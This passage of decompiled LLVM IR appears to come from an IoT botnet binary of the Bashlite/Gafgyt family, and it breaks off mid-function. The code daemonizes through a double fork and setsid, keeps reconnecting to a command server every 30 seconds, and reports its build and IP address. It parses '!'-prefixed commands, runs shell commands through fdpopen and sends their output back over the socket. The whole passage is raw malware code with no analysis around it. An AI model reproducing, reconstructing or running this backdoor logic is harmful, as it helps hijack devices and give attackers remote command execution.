  %v3_1000b4a8 = call i32 @__GI_strcoll(i8* %v2_1000b4a8, i32 ptrtoint (i32* @global_var_100164e8.553 to i32))
  %v3_1000b4b0 = icmp eq i32 %v3_1000b4a8, 0
  br i1 %v3_1000b4b0, label %dec_label_pc_1000b5d4, label %dec_label_pc_1000b4c8.preheader

dec_label_pc_1000b4c8.preheader:                  ; preds = %dec_label_pc_1000b468
  %v2_1000b4cc115 = load i32, i32* %v1_1000b360, align 4
  %v2_1000b4d4116 = add i32 %v2_1000b4cc115, %v0_1000b474
  %v1_1000b4d8117 = inttoptr i32 %v2_1000b4d4116 to i8*
  %v2_1000b4d8118 = load i8, i8* %v1_1000b4d8117, align 1
  %v3_1000b4e0122 = icmp eq i8 %v2_1000b4d8118, 47
  br i1 %v3_1000b4e0122, label %dec_label_pc_1000b4e8, label %dec_label_pc_1000b4bc

dec_label_pc_1000b4bc:                            ; preds = %dec_label_pc_1000b4c8.preheader, %dec_label_pc_1000b4bc
  %stack_var_-5760.0123 = phi i32 [ %v1_1000b4c0, %dec_label_pc_1000b4bc ], [ %v0_1000b474, %dec_label_pc_1000b4c8.preheader ]
  %v1_1000b4c0 = add i32 %stack_var_-5760.0123, -1
  %v2_1000b4cc = load i32, i32* %v1_1000b360, align 4
  %v2_1000b4d4 = add i32 %v2_1000b4cc, %v1_1000b4c0
  %v1_1000b4d8 = inttoptr i32 %v2_1000b4d4 to i8*
  %v2_1000b4d8 = load i8, i8* %v1_1000b4d8, align 1
  %v3_1000b4e0 = icmp eq i8 %v2_1000b4d8, 47
  br i1 %v3_1000b4e0, label %dec_label_pc_1000b4e8, label %dec_label_pc_1000b4bc

dec_label_pc_1000b4e8:                            ; preds = %dec_label_pc_1000b4bc, %dec_label_pc_1000b4c8.preheader
  %stack_var_-5760.0.lcssa = phi i32 [ %v0_1000b474, %dec_label_pc_1000b4c8.preheader ], [ %v1_1000b4c0, %dec_label_pc_1000b4bc ]
  %v2_1000b4ec = load i32, i32* %v1_1000b360, align 4
  %v2_1000b4f4 = add i32 %v2_1000b4ec, %stack_var_-5760.0.lcssa
  %v2_1000b4f8 = ptrtoint i32* %stack_var_-5472 to i32
  store i32 %v2_1000b4f8, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000b51c.555 to i32), i32* @lr, align 4
  %v6_1000b518 = load i32, i32* @r8, align 4
  %v9_1000b518 = call i32 @sprintf(i32 %v2_1000b4f8, i32 ptrtoint ([8 x i8]* @global_var_100164ec.554 to i32), i32 %v2_1000b488, i32 %v2_1000b4f4, i32 268500992, i32 %v6_1000b518, i32 268500992, i32 ptrtoint (i32* @0 to i32))
  %v2_1000b520 = ptrtoint i32* %stack_var_-5216 to i32
  br label %dec_label_pc_1000b560.outer

dec_label_pc_1000b520:                            ; preds = %dec_label_pc_1000b560
  store i32 268481844, i32* @lr, align 4
  %v3_1000b530 = call i32 @fgets(i32 %v2_1000b520, i32 1024, i32 %stack_var_-5756.0)
  store i32 %v2_1000b520, i32* @r3, align 4
  store i32 %v2_1000b4f8, i32* @r4, align 4
  %v2_1000b544 = call i32 @__GI_strcasecmp(i32 %v2_1000b520, i32 %v2_1000b4f8)
  %v3_1000b54c = icmp eq i32 %v2_1000b544, 0
  br i1 %v3_1000b54c, label %dec_label_pc_1000b554, label %dec_label_pc_1000b560

dec_label_pc_1000b554:                            ; preds = %dec_label_pc_1000b520
  %v1_1000b558 = add i32 %stack_var_-5764.0.ph, 1
  br label %dec_label_pc_1000b560.outer

dec_label_pc_1000b560.outer:                      ; preds = %dec_label_pc_1000b554, %dec_label_pc_1000b4e8
  %stack_var_-5764.0.ph = phi i32 [ %v1_1000b558, %dec_label_pc_1000b554 ], [ 0, %dec_label_pc_1000b4e8 ]
  br label %dec_label_pc_1000b560

dec_label_pc_1000b560:                            ; preds = %dec_label_pc_1000b560.outer, %dec_label_pc_1000b520
  store i32 268481896, i32* @lr, align 4
  %v1_1000b564 = call i32 @feof(i32 %stack_var_-5756.0)
  %v3_1000b56c = icmp eq i32 %v1_1000b564, 0
  br i1 %v3_1000b56c, label %dec_label_pc_1000b520, label %dec_label_pc_1000b574

dec_label_pc_1000b574:                            ; preds = %dec_label_pc_1000b560
  %v3_1000b578 = icmp eq i32 %stack_var_-5764.0.ph, 0
  br i1 %v3_1000b578, label %dec_label_pc_1000b580, label %dec_label_pc_1000b5c8

dec_label_pc_1000b580:                            ; preds = %dec_label_pc_1000b574
  store i32 268481928, i32* @lr, align 4
  %v1_1000b584 = inttoptr i32 %stack_var_-5756.0 to i16*
  %v2_1000b584 = call i32 @__GI_fclose(i16* %v1_1000b584)
  %v4_1000b588 = ptrtoint i8* %stack_var_-5752.0 to i32
  store i32 268481944, i32* @lr, align 4
  %v3_1000b594 = call i32 @__GI_fopen(i32 %v4_1000b588, i32 ptrtoint (i32* @global_var_100164f4.556 to i32))
  %v3_1000b5a4 = icmp eq i32 %v3_1000b594, 0
  br i1 %v3_1000b5a4, label %dec_label_pc_1000b5dc, label %dec_label_pc_1000b5ac

dec_label_pc_1000b5ac:                            ; preds = %dec_label_pc_1000b580
  store i32 268481980, i32* @lr, align 4
  %v2_1000b5b8 = call i32 @__GI_fputs(i32 %v2_1000b4f8, i32 %v3_1000b594)
  store i32 ptrtoint (i32* @global_var_1000b5c4.557 to i32), i32* @lr, align 4
  %v1_1000b5c0 = inttoptr i32 %v3_1000b594 to i16*
  %v2_1000b5c0 = call i32 @__GI_fclose(i16* %v1_1000b5c0)
  br label %dec_label_pc_1000b5dc

dec_label_pc_1000b5c8:                            ; preds = %dec_label_pc_1000b574
  store i32 ptrtoint (i32* @global_var_1000b5d0.558 to i32), i32* @lr, align 4
  %v1_1000b5cc = inttoptr i32 %stack_var_-5756.0 to i16*
  %v2_1000b5cc = call i32 @__GI_fclose(i16* %v1_1000b5cc)
  br label %dec_label_pc_1000b5dc

dec_label_pc_1000b5d4:                            ; preds = %dec_label_pc_1000b468
  store i32 268482012, i32* @lr, align 4
  %v1_1000b5d8 = inttoptr i32 %stack_var_-5756.0 to i16*
  %v2_1000b5d8 = call i32 @__GI_fclose(i16* %v1_1000b5d8)
  br label %dec_label_pc_1000b5dc

dec_label_pc_1000b5dc:                            ; preds = %dec_label_pc_1000b580, %dec_label_pc_1000b45c, %dec_label_pc_1000b5c8, %dec_label_pc_1000b5ac, %dec_label_pc_1000b5d4
  store i32 ptrtoint (i32* @global_var_1000b5e0.559 to i32), i32* @lr, align 4
  %v0_1000b5dc = call i32 @getOurIP()
  store i32 268482020, i32* @lr, align 4
  %v0_1000b5e0 = call i32 @__libc_fork()
  %v3_1000b5f0 = icmp eq i32 %v0_1000b5e0, 0
  br i1 %v3_1000b5f0, label %dec_label_pc_1000b620, label %dec_label_pc_1000b664

dec_label_pc_1000b620:                            ; preds = %dec_label_pc_1000b5dc
  store i32 268482084, i32* @lr, align 4
  %v0_1000b620 = call i32 @__libc_fork()
  %v3_1000b630 = icmp eq i32 %v0_1000b620, 0
  br i1 %v3_1000b630, label %dec_label_pc_1000b640.thread, label %dec_label_pc_1000b64c

dec_label_pc_1000b640.thread:                     ; preds = %dec_label_pc_1000b620
  br label %dec_label_pc_1000b678

dec_label_pc_1000b64c:                            ; preds = %dec_label_pc_1000b620
  %v0_1000b63c = call i32 @__GI_exit()
  %v3_1000b65c = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_100164f8.561 to i32), i32 268500992)
  br label %dec_label_pc_1000b678

dec_label_pc_1000b664:                            ; preds = %dec_label_pc_1000b5dc
  %v2_1000b5f8 = ptrtoint i32* %stack_var_-5732 to i32
  store i32 ptrtoint ([3 x i8]* @global_var_1000b60c.560 to i32), i32* @lr, align 4
  %v3_1000b608 = call i32 @__libc_waitpid(i32 %v0_1000b5e0, i32 %v2_1000b5f8, i32 0)
  %v0_1000b610 = call i32 @__GI_exit()
  %v3_1000b674 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_100164f8.561 to i32), i32 268500992)
  br label %dec_label_pc_1000b678

dec_label_pc_1000b678:                            ; preds = %dec_label_pc_1000b640.thread, %dec_label_pc_1000b64c, %dec_label_pc_1000b664
  store i32 268482172, i32* @lr, align 4
  %v0_1000b678 = call i32 @__GI_setsid()
  store i32 ptrtoint ([3 x i8]* @global_var_1000b688.564 to i32), i32* @lr, align 4
  %v2_1000b684 = call i32 @chdir(i32 ptrtoint (i32* @global_var_100164e8.553 to i32), i32 268500992)
  store i32 ptrtoint (i32* @global_var_1000b694.565 to i32), i32* @lr, align 4
  %v2_1000b690 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_1000bf1c = ptrtoint i32* %stack_var_-4192 to i32
  %v4_1000bf2c = bitcast i32* %stack_var_-4192 to i8*
  %v2_1000b9e4 = ptrtoint i32* %stack_var_-5816 to i32
  %v2_1000bcb4 = ptrtoint i32* %stack_var_-5216 to i32
  %v1_1000bb20 = or i32 %v2_1000bf1c, 1
  %v2_1000bee4 = add i32 %v2_1000b9e4, 344
  br label %dec_label_pc_1000b698.outer

dec_label_pc_1000b698.outer:                      ; preds = %dec_label_pc_1000ba68, %dec_label_pc_1000bf14, %dec_label_pc_1000b678
  %stack_var_-5748.0.ph21 = phi i32 [ 0, %dec_label_pc_1000b678 ], [ %stack_var_-5748.2.ph, %dec_label_pc_1000bf14 ], [ %v1_1000ba6c, %dec_label_pc_1000ba68 ]
  %v0_1000b69825 = call i32 @initConnection()
  %v3_1000b6a028 = icmp eq i32 %v0_1000b69825, 0
  br i1 %v3_1000b6a028, label %dec_label_pc_1000b6b4, label %dec_label_pc_1000b6a8

dec_label_pc_1000b6a8:                            ; preds = %dec_label_pc_1000b698.outer, %dec_label_pc_1000b6a8
  store i32 268482224, i32* @lr, align 4
  %v1_1000b6ac = call i32 @sleep(i32 30)
  %v0_1000b698 = call i32 @initConnection()
  %v3_1000b6a0 = icmp eq i32 %v0_1000b698, 0
  br i1 %v3_1000b6a0, label %dec_label_pc_1000b6b4, label %dec_label_pc_1000b6a8

dec_label_pc_1000b6b4:                            ; preds = %dec_label_pc_1000b6a8, %dec_label_pc_1000b698.outer
  %v1_1000b6bc = call i32 @getBuild(i32 268632064)
  %v3_1000b6c8 = load i32, i32* @global_var_100285d8.249, align 4
  store i32 %v3_1000b6c8, i32* %stack_var_-80, align 4
  store i32 268482268, i32* @lr, align 4
  %v3_1000b6d8 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 268632064)
  %v0_1000b6e0 = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_1000b6fc.567 to i32), i32* @lr, align 4
  %v6_1000b6f8 = call i32 @sockprintf(i32 %v0_1000b6e0, i32 ptrtoint ([12 x i8]* @global_var_10016508.566 to i32), i32 %v1_1000b6bc)
  br label %dec_label_pc_1000bf14.outer

dec_label_pc_1000b71c:                            ; preds = %dec_label_pc_1000b9d0, %dec_label_pc_1000b974
  %v1_1000b720 = mul i32 %storemerge12, 4
  %v3_1000b72c = load i32, i32* @global_var_100285e4.48, align 4
  %v2_1000b730 = add i32 %v3_1000b72c, %v1_1000b720
  %v1_1000b734 = inttoptr i32 %v2_1000b730 to i32*
  %v2_1000b734 = load i32, i32* %v1_1000b734, align 4
  store i32 268482376, i32* @lr, align 4
  %v3_1000b744 = call i32 @__libc_waitpid(i32 %v2_1000b734, i32 0, i32 1)
  %tmp110 = icmp slt i32 %v3_1000b744, 1
  br i1 %tmp110, label %dec_label_pc_1000b968, label %dec_label_pc_1000b7ac

dec_label_pc_1000b764:                            ; preds = %dec_label_pc_1000b7ac, %dec_label_pc_1000b7f4
  %v1_1000b768 = mul i32 %v1_1000b758, 4
  %v3_1000b774 = load i32, i32* @global_var_100285e4.48, align 4
  %v2_1000b778 = add i32 %v3_1000b774, %v1_1000b768
  %v1_1000b77c = add i32 %v2_1000b778, -4
  %v1_1000b798 = inttoptr i32 %v2_1000b778 to i32*
  %v2_1000b798 = load i32, i32* %v1_1000b798, align 4
  %v2_1000b79c = inttoptr i32 %v1_1000b77c to i32*
  store i32 %v2_1000b798, i32* %v2_1000b79c, align 4
  br label %dec_label_pc_1000b7ac

dec_label_pc_1000b7ac:                            ; preds = %dec_label_pc_1000b71c, %dec_label_pc_1000b764
  %storemerge18 = phi i32 [ %v1_1000b758, %dec_label_pc_1000b764 ], [ %storemerge12, %dec_label_pc_1000b71c ]
  %v1_1000b758 = add i32 %storemerge18, 1
  %v2_1000b7d4 = load i32, i32* @global_var_100285b8.46, align 4
  %v3_1000b7ec = icmp eq i32 %v2_1000b7d4, 0
  br i1 %v3_1000b7ec, label %dec_label_pc_1000b7f4, label %dec_label_pc_1000b764

dec_label_pc_1000b7f4:                            ; preds = %dec_label_pc_1000b7ac
  %v3_1000b7d8 = load i32, i32* @global_var_100285bc.47, align 4
  %v3_1000b80c = icmp ugt i32 %v3_1000b7d8, %v1_1000b758
  br i1 %v3_1000b80c, label %dec_label_pc_1000b764, label %dec_label_pc_1000b814

dec_label_pc_1000b814:                            ; preds = %dec_label_pc_1000b7f4
  %v1_1000b818 = mul i32 %v1_1000b758, 4
  %v3_1000b824 = load i32, i32* @global_var_100285e4.48, align 4
  %v2_1000b828 = add i32 %v1_1000b818, -4
  %v1_1000b82c = add i32 %v2_1000b828, %v3_1000b824
  %v2_1000b834 = inttoptr i32 %v1_1000b82c to i32*
  store i32 0, i32* %v2_1000b834, align 4
  %v3_1000b840 = load i32, i32* @global_var_100285bc.47, align 4
  %v2_1000b844 = load i32, i32* @global_var_100285b8.46, align 4
  %v1_1000b848 = add i32 %v3_1000b840, -1
  %v2_1000b848 = icmp ne i32 %v3_1000b840, 0
  %v2_1000b84c = zext i1 %v2_1000b848 to i32
  %v3_1000b84c = add i32 %v2_1000b844, -1
  %v4_1000b84c = add i32 %v3_1000b84c, %v2_1000b84c
  store i32 %v4_1000b84c, i32* @global_var_100285b8.46, align 4
  store i32 %v1_1000b848, i32* @global_var_100285bc.47, align 4
  %v1_1000b87c = mul i32 %v1_1000b848, 4
  %v1_1000b884 = add i32 %v1_1000b87c, 4
  store i32 %v1_1000b884, i32* @r3, align 4
  store i32 268482704, i32* @lr, align 4
  %v0_1000b88c = call i32 @malloc()
  br label %dec_label_pc_1000b8e4

dec_label_pc_1000b8a4:                            ; preds = %dec_label_pc_1000b8e4, %dec_label_pc_1000b92c
  %v1_1000b8a8 = mul i32 %storemerge17, 4
  %v2_1000b8b4 = add i32 %v1_1000b8a8, %v0_1000b88c
  %v3_1000b8c8 = load i32, i32* @global_var_100285e4.48, align 4
  %v2_1000b8cc = add i32 %v3_1000b8c8, %v1_1000b8a8
  %v1_1000b8d0 = inttoptr i32 %v2_1000b8cc to i32*
  %v2_1000b8d0 = load i32, i32* %v1_1000b8d0, align 4
  %v2_1000b8d4 = inttoptr i32 %v2_1000b8b4 to i32*
  store i32 %v2_1000b8d0, i32* %v2_1000b8d4, align 4
  %v1_1000b8dc = add i32 %storemerge17, 1
  br label %dec_label_pc_1000b8e4

dec_label_pc_1000b8e4:                            ; preds = %dec_label_pc_1000b814, %dec_label_pc_1000b8a4
  %storemerge17 = phi i32 [ 0, %dec_label_pc_1000b814 ], [ %v1_1000b8dc, %dec_label_pc_1000b8a4 ]
  %v2_1000b90c = load i32, i32* @global_var_100285b8.46, align 4
  %v3_1000b924 = icmp eq i32 %v2_1000b90c, 0
  br i1 %v3_1000b924, label %dec_label_pc_1000b92c, label %dec_label_pc_1000b8a4

dec_label_pc_1000b92c:                            ; preds = %dec_label_pc_1000b8e4
  %v3_1000b910 = load i32, i32* @global_var_100285bc.47, align 4
  %v3_1000b944 = icmp ugt i32 %v3_1000b910, %storemerge17
  br i1 %v3_1000b944, label %dec_label_pc_1000b8a4, label %dec_label_pc_1000b94c

dec_label_pc_1000b94c:                            ; preds = %dec_label_pc_1000b92c
  %v3_1000b950 = load i32, i32* @global_var_100285e4.48, align 4
  store i32 %v3_1000b950, i32* @r3, align 4
  store i32 268482908, i32* @lr, align 4
  %v0_1000b958 = call i32 @free()
  store i32 %v0_1000b88c, i32* @global_var_100285e4.48, align 4
  br label %dec_label_pc_1000b968

dec_label_pc_1000b968:                            ; preds = %dec_label_pc_1000b71c, %dec_label_pc_1000b94c
  %v1_1000b96c = add i32 %storemerge12, 1
  br label %dec_label_pc_1000b974

dec_label_pc_1000b974:                            ; preds = %dec_label_pc_1000bf14, %dec_label_pc_1000b968
  %storemerge12 = phi i32 [ %v1_1000b96c, %dec_label_pc_1000b968 ], [ 0, %dec_label_pc_1000bf14 ]
  %tmp125 = icmp slt i32 %storemerge12, 0
  %v1_1000b978 = zext i1 %tmp125 to i32
  %v2_1000b978 = ashr i32 %storemerge12, 31
  %v3_1000b978 = and i32 %v2_1000b978, -2
  %v4_1000b978 = or i32 %v3_1000b978, %v1_1000b978
  %v2_1000b9a0 = load i32, i32* @global_var_100285b8.46, align 4
  %v3_1000b9a4 = load i32, i32* @global_var_100285bc.47, align 4
  %v3_1000b9b8 = icmp ugt i32 %v2_1000b9a0, %v4_1000b978
  br i1 %v3_1000b9b8, label %dec_label_pc_1000b71c, label %dec_label_pc_1000b9c0

dec_label_pc_1000b9c0:                            ; preds = %dec_label_pc_1000b974
  %v4_1000b9b8 = icmp eq i32 %v2_1000b9a0, %v4_1000b978
  br i1 %v4_1000b9b8, label %dec_label_pc_1000b9d0, label %dec_label_pc_1000b9e0

dec_label_pc_1000b9d0:                            ; preds = %dec_label_pc_1000b9c0
  %v3_1000b9d8 = icmp ugt i32 %v3_1000b9a4, %storemerge12
  br i1 %v3_1000b9d8, label %dec_label_pc_1000b71c, label %dec_label_pc_1000b9e0

dec_label_pc_1000b9e0:                            ; preds = %dec_label_pc_1000b9c0, %dec_label_pc_1000b9d0
  %v2_1000b9e8 = add i32 %v5_1000bf2c, %v2_1000b9e4
  %v3_1000b9f0 = add i32 %v2_1000b9e8, 1624
  %v4_1000b9f0 = inttoptr i32 %v3_1000b9f0 to i8*
  store i8 0, i8* %v4_1000b9f0, align 1
  %v1_1000b9fc = call i32 @trim(i32 %v2_1000bf1c)
  store i32 268483092, i32* @lr, align 4
  %v5_1000ba10 = call i32 @strstr(i32 %v2_1000bf1c, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100150d4.30, i32 0, i32 0), i32 268500992)
  %v4_1000ba1c = icmp eq i32 %v5_1000ba10, %v2_1000bf1c
  br i1 %v4_1000ba1c, label %dec_label_pc_1000ba24, label %dec_label_pc_1000ba44

dec_label_pc_1000ba24:                            ; preds = %dec_label_pc_1000b9e0
  %v3_1000ba28 = load i32, i32* @global_var_100285b0.29, align 4
  store i32 ptrtoint (i32* @global_var_1000ba40.569 to i32), i32* @lr, align 4
  %v4_1000ba3c = call i32 @sockprintf(i32 %v3_1000ba28, i32 ptrtoint ([5 x i8]* @global_var_10016514.568 to i32), i32 268500992)
  br label %dec_label_pc_1000bf14

dec_label_pc_1000ba44:                            ; preds = %dec_label_pc_1000b9e0
  store i32 268483160, i32* @lr, align 4
  %v5_1000ba54 = call i32 @strstr(i32 %v2_1000bf1c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001651c.570, i32 0, i32 0), i32 268500992)
  %v4_1000ba60 = icmp eq i32 %v5_1000ba54, %v2_1000bf1c
  br i1 %v4_1000ba60, label %dec_label_pc_1000ba68, label %dec_label_pc_1000ba9c

dec_label_pc_1000ba68:                            ; preds = %dec_label_pc_1000ba44
  %v1_1000ba6c = add i32 %stack_var_-5748.2.ph, 1
  %v3_1000ba84 = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_10016520.571 to i32), i32 268500992)
  %tmp111 = icmp slt i32 %v1_1000ba6c, 21
  br i1 %tmp111, label %dec_label_pc_1000b698.outer, label %dec_label_pc_1000ba94

dec_label_pc_1000ba94:                            ; preds = %dec_label_pc_1000ba68
  %v0_1000ba98 = call i32 @__GI_exit()
  br label %dec_label_pc_1000ba9c

dec_label_pc_1000ba9c:                            ; preds = %dec_label_pc_1000ba44, %dec_label_pc_1000ba94
  %stack_var_-5748.1 = phi i32 [ %v1_1000ba6c, %dec_label_pc_1000ba94 ], [ %stack_var_-5748.2.ph, %dec_label_pc_1000ba44 ]
  %v2_1000baa8 = load i8, i8* %v4_1000bf2c, align 4
  %v3_1000bab0 = icmp eq i8 %v2_1000baa8, 33
  br i1 %v3_1000bab0, label %dec_label_pc_1000bad4, label %dec_label_pc_1000bf14.outer

dec_label_pc_1000bad4:                            ; preds = %dec_label_pc_1000ba9c, %dec_label_pc_1000bae8
  %storemerge = phi i32 [ %v1_1000babc, %dec_label_pc_1000bae8 ], [ %v2_1000bf1c, %dec_label_pc_1000ba9c ]
  %v1_1000babc = add i32 %storemerge, 1
  %storemerge8 = inttoptr i32 %v1_1000babc to i8*
  %v2_1000bad8 = load i8, i8* %storemerge8, align 1
  %v3_1000bae0 = icmp eq i8 %v2_1000bad8, 32
  br i1 %v3_1000bae0, label %dec_label_pc_1000bafc, label %dec_label_pc_1000bae8

dec_label_pc_1000bae8:                            ; preds = %dec_label_pc_1000bad4
  %v2_1000baec = load i8, i8* %storemerge8, align 1
  %v3_1000baf4 = icmp eq i8 %v2_1000baec, 0
  br i1 %v3_1000baf4, label %dec_label_pc_1000bafc, label %dec_label_pc_1000bad4

dec_label_pc_1000bafc:                            ; preds = %dec_label_pc_1000bae8, %dec_label_pc_1000bad4
  %v2_1000bb00 = load i8, i8* %storemerge8, align 1
  %v3_1000bb08 = icmp eq i8 %v2_1000bb00, 0
  br i1 %v3_1000bb08, label %dec_label_pc_1000bf14.outer, label %dec_label_pc_1000bb10

dec_label_pc_1000bb10:                            ; preds = %dec_label_pc_1000bafc
  store i8 0, i8* %storemerge8, align 1
  store i32 %v1_1000bb20, i32* @r3, align 4
  %v0_1000bb30 = call i32 @__GI_strlen()
  %v2_1000bb40 = add i32 %v0_1000bb30, %v2_1000bf1c
  %v1_1000bb44 = add i32 %v2_1000bb40, 2
  %v2_1000bb90 = add i32 %v2_1000bb40, 1
  br label %dec_label_pc_1000bb78

dec_label_pc_1000bb50:                            ; preds = %dec_label_pc_1000bba8, %dec_label_pc_1000bb78
  store i32 %v1_1000bb44, i32* @r3, align 4
  %v0_1000bb58 = call i32 @__GI_strlen()
  %v1_1000bb6c = add i32 %v0_1000bb58, %v2_1000bb90
  %v3_1000bb74 = inttoptr i32 %v1_1000bb6c to i8*
  store i8 0, i8* %v3_1000bb74, align 1
  br label %dec_label_pc_1000bb78

dec_label_pc_1000bb78:                            ; preds = %dec_label_pc_1000bb10, %dec_label_pc_1000bb50
  store i32 %v1_1000bb44, i32* @r3, align 4
  %v0_1000bb80 = call i32 @__GI_strlen()
  %v1_1000bb94 = add i32 %v0_1000bb80, %v2_1000bb90
  %v1_1000bb98 = inttoptr i32 %v1_1000bb94 to i8*
  %v2_1000bb98 = load i8, i8* %v1_1000bb98, align 1
  %v3_1000bba0 = icmp eq i8 %v2_1000bb98, 10
  br i1 %v3_1000bba0, label %dec_label_pc_1000bb50, label %dec_label_pc_1000bba8

dec_label_pc_1000bba8:                            ; preds = %dec_label_pc_1000bb78
  store i32 %v1_1000bb44, i32* @r3, align 4
  %v0_1000bbb0 = call i32 @__GI_strlen()
  %v1_1000bbc4 = add i32 %v0_1000bbb0, %v2_1000bb90
  %v1_1000bbc8 = inttoptr i32 %v1_1000bbc4 to i8*
  %v2_1000bbc8 = load i8, i8* %v1_1000bbc8, align 1
  %v3_1000bbd0 = icmp eq i8 %v2_1000bbc8, 13
  br i1 %v3_1000bbd0, label %dec_label_pc_1000bb50, label %dec_label_pc_1000bbf0.preheader

dec_label_pc_1000bbf0.preheader:                  ; preds = %dec_label_pc_1000bba8
  %stack_var_-5780.029 = inttoptr i32 %v1_1000bb44 to i8*
  %v2_1000bbf430 = load i8, i8* %stack_var_-5780.029, align 1
  %v3_1000bbfc34 = icmp eq i8 %v2_1000bbf430, 32
  br i1 %v3_1000bbfc34, label %dec_label_pc_1000bc18, label %dec_label_pc_1000bc04

dec_label_pc_1000bbe4:                            ; preds = %dec_label_pc_1000bc04
  %v1_1000bbe8 = add i32 %storemerge1935, 1
  %stack_var_-5780.0 = inttoptr i32 %v1_1000bbe8 to i8*
  %v2_1000bbf4 = load i8, i8* %stack_var_-5780.0, align 1
  %v3_1000bbfc = icmp eq i8 %v2_1000bbf4, 32
  br i1 %v3_1000bbfc, label %dec_label_pc_1000bc18, label %dec_label_pc_1000bc04

dec_label_pc_1000bc04:                            ; preds = %dec_label_pc_1000bbf0.preheader, %dec_label_pc_1000bbe4
  %stack_var_-5780.036 = phi i8* [ %stack_var_-5780.0, %dec_label_pc_1000bbe4 ], [ %stack_var_-5780.029, %dec_label_pc_1000bbf0.preheader ]
  %storemerge1935 = phi i32 [ %v1_1000bbe8, %dec_label_pc_1000bbe4 ], [ %v1_1000bb44, %dec_label_pc_1000bbf0.preheader ]
  %v2_1000bc08 = load i8, i8* %stack_var_-5780.036, align 1
  %v3_1000bc10 = icmp eq i8 %v2_1000bc08, 0
  br i1 %v3_1000bc10, label %dec_label_pc_1000bc18, label %dec_label_pc_1000bbe4

dec_label_pc_1000bc18:                            ; preds = %dec_label_pc_1000bbe4, %dec_label_pc_1000bc04, %dec_label_pc_1000bbf0.preheader
  %storemerge19.lcssa = phi i32 [ %v1_1000bb44, %dec_label_pc_1000bbf0.preheader ], [ %v1_1000bbe8, %dec_label_pc_1000bbe4 ], [ %storemerge1935, %dec_label_pc_1000bc04 ]
  %stack_var_-5780.0.lcssa = phi i8* [ %stack_var_-5780.029, %dec_label_pc_1000bbf0.preheader ], [ %stack_var_-5780.0, %dec_label_pc_1000bbe4 ], [ %stack_var_-5780.036, %dec_label_pc_1000bc04 ]
  store i8 0, i8* %stack_var_-5780.0.lcssa, align 1
  %v1_1000bc28 = add i32 %storemerge19.lcssa, 1
  %v2_1000bc7441 = load i8, i8* %stack_var_-5780.029, align 1
  %v3_1000bc7c44 = icmp eq i8 %v2_1000bc7441, 0
  br i1 %v3_1000bc7c44, label %dec_label_pc_1000bc84, label %dec_label_pc_1000bc3c

dec_label_pc_1000bc3c:                            ; preds = %dec_label_pc_1000bc18, %dec_label_pc_1000bc3c
  %storemerge746 = phi i8* [ %storemerge7, %dec_label_pc_1000bc3c ], [ %stack_var_-5780.029, %dec_label_pc_1000bc18 ]
  %storemerge1445 = phi i32 [ %v1_1000bc68, %dec_label_pc_1000bc3c ], [ %v1_1000bb44, %dec_label_pc_1000bc18 ]
  %v3_1000bc40 = load i8, i8* %storemerge746, align 1
  %v4_1000bc40 = zext i8 %v3_1000bc40 to i32
  store i32 268483668, i32* @lr, align 4
  %v3_1000bc50 = call i32 @__GI_toupper(i32 %v4_1000bc40, i32 %storemerge1445)
  %v1_1000bc60 = trunc i32 %v3_1000bc50 to i8
  store i8 %v1_1000bc60, i8* %storemerge746, align 1
  %v1_1000bc68 = add i32 %storemerge1445, 1
  %storemerge7 = inttoptr i32 %v1_1000bc68 to i8*
  %v2_1000bc74 = load i8, i8* %storemerge7, align 1
  %v3_1000bc7c = icmp eq i8 %v2_1000bc74, 0
  br i1 %v3_1000bc7c, label %dec_label_pc_1000bc84, label %dec_label_pc_1000bc3c

dec_label_pc_1000bc84:                            ; preds = %dec_label_pc_1000bc3c, %dec_label_pc_1000bc18
  store i32 ptrtoint ([3 x i8]* @global_var_10016534.572 to i32), i32* @r4, align 4
  %v4_1000bc94 = call i32 @__GI_strcoll(i8* %stack_var_-5780.029, i32 ptrtoint ([3 x i8]* @global_var_10016534.572 to i32))
  %v3_1000bc9c = icmp eq i32 %v4_1000bc94, 0
  br i1 %v3_1000bc9c, label %dec_label_pc_1000bca4, label %dec_label_pc_1000bd90

dec_label_pc_1000bca4:                            ; preds = %dec_label_pc_1000bc84
  store i32 268483752, i32* @lr, align 4
  %v0_1000bca4 = call i32 @listFork()
  %v3_1000bcac = icmp eq i32 %v0_1000bca4, 0
  br i1 %v3_1000bcac, label %dec_label_pc_1000bcb4, label %dec_label_pc_1000bf14.outer

dec_label_pc_1000bcb4:                            ; preds = %dec_label_pc_1000bca4
  store i32 268483788, i32* @lr, align 4
  %v3_1000bcc8 = call i32 @__GI_memset(i32 %v2_1000bcb4, i32 0, i32 1024)
  %v4_1000bce8 = call i32 @szprintf(i32 %v2_1000bcb4, i32 ptrtoint ([8 x i8]* @global_var_10016538.573 to i32), i32 %v1_1000bc28)
  store i32 268483844, i32* @lr, align 4
  %v3_1000bd00 = call i32 @fdpopen(i32 %v2_1000bcb4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_100164d4.551, i32 0, i32 0))
  br label %dec_label_pc_1000bd60

dec_label_pc_1000bd10:                            ; preds = %dec_label_pc_1000bd60
  %v1_1000bd18 = call i32 @trim(i32 %v2_1000bcb4)
  %v3_1000bd20 = load i32, i32* @global_var_100285b0.29, align 4
  store i32 268483904, i32* @lr, align 4
  %v5_1000bd3c = call i32 @sockprintf(i32 %v3_1000bd20, i32 ptrtoint ([3 x i8]* @global_var_10016540.574 to i32), i32 %v2_1000bcb4)
  store i32 ptrtoint ([3 x i8]* @global_var_1000bd58.575 to i32), i32* @lr, align 4
  %v3_1000bd54 = call i32 @__GI_memset(i32 %v2_1000bcb4, i32 0, i32 1024)
  store i32 268483936, i32* @lr, align 4
  %v1_1000bd5c = call i32 @sleep(i32 1)
  br label %dec_label_pc_1000bd60

dec_label_pc_1000bd60:                            ; preds = %dec_label_pc_1000bcb4, %dec_label_pc_1000bd10
  %v3_1000bd70 = call i32 @fdgets(i32 %v2_1000bcb4, i32 1024, i32 %v3_1000bd00)
  %v3_1000bd78 = icmp eq i32 %v3_1000bd70, 0
